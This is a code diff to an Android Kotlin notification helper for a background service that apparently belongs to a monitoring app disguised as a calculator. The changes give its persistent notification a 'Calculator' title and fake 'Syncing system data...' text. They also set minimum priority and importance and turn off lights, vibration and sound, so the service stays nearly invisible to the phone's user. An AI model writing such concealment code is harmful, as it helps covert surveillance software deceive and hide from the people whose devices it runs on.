@@ -33,10 +33,13 @@ class ChildServiceNotificationHelper(private val service: Service) {
             val channel = NotificationChannel(
                 CHANNEL_ID,
                 "Calculator Framework",
-                NotificationManager.IMPORTANCE_LOW
+                NotificationManager.IMPORTANCE_MIN
             ).apply {
                 description = "Background system sync service"
                 setShowBadge(false)
+                enableLights(false)
+                enableVibration(false)
+                setSound(null, null)
             }
             val manager = service.getSystemService(NotificationManager::class.java)
             manager?.createNotificationChannel(channel)
@@ -46,12 +49,13 @@ class ChildServiceNotificationHelper(private val service: Service) {
     fun buildNotification(contentText: String): Notification {
         val discreetText = "Syncing system data..."
         return NotificationCompat.Builder(service, CHANNEL_ID)
-            .setContentTitle("Calculator Framework")
+            .setContentTitle("Calculator")
             .setContentText(discreetText)
             .setSmallIcon(R.mipmap.ic_launcher)
-            .setPriority(NotificationCompat.PRIORITY_LOW)
+            .setPriority(NotificationCompat.PRIORITY_MIN)
             .setCategory(NotificationCompat.CATEGORY_SERVICE)
             .setOngoing(true)
+            .setSilent(true)
             .build()
     }
 
